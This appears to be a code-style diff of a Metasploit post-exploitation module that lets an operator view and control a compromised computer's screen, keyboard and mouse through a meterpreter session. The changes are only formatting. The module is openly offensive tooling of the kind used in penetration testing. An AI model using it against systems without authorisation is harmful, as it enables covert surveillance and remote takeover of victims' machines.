@@ -7,20 +7,23 @@ class MetasploitModule < Msf::Post
 
   include Msf::Exploit::Remote::HttpServer
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'           => 'Multi Manage the screen of the target meterpreter session',
-      'Description'    => %q{
-        This module allows you to view and control the screen of the target computer via
-        a local browser window. The module continually screenshots the target screen and
-        also relays all mouse and keyboard events to session.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => [ 'timwr'],
-      'Platform'       => [ 'linux', 'win' ],
-      'SessionTypes'   => [ 'meterpreter' ],
-      'DefaultOptions' => { 'SRVHOST' => '127.0.0.1' },
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Manage the screen of the target meterpreter session',
+        'Description' => %q{
+          This module allows you to view and control the screen of the target computer via
+          a local browser window. The module continually screenshots the target screen and
+          also relays all mouse and keyboard events to session.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'timwr'],
+        'Platform' => [ 'linux', 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'DefaultOptions' => { 'SRVHOST' => '127.0.0.1' }
+      )
+    )
   end
 
   def run
@@ -31,7 +34,7 @@ class MetasploitModule < Msf::Post
 
   def perform_event(query)
     action = query['action'].first
-    if action == "key"
+    if action == 'key'
       key = query['key'].first.to_i
       keyaction = query['keyaction'].first.to_i
       session.ui.keyevent_send(key, keyaction) if key
@@ -51,7 +54,7 @@ class MetasploitModule < Msf::Post
       else
         data = session.ui.screenshot(50)
       end
-      send_response(cli, data, {'Content-Type'=>'image/jpeg', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
+      send_response(cli, data, { 'Content-Type' => 'image/jpeg', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0' })
     elsif request.uri =~ %r{/event$}
       query = CGI.parse(request.body)
       seq = query['i'].first.to_i
@@ -61,11 +64,12 @@ class MetasploitModule < Msf::Post
       else
         @key_sequence[seq] = query
       end
-      while true
+      loop do
         event = @key_sequence[@last_sequence + 1]
         break unless event
+
         perform_event(event)
-        @last_sequence = @last_sequence + 1
+        @last_sequence += 1
         @key_sequence.delete(@last_sequence)
       end
 
@@ -164,7 +168,7 @@ img.ondblclick = function(event) {
 </script>
 </html>
     ^
-      send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
+      send_response(cli, html, { 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0' })
     end
   end
 end
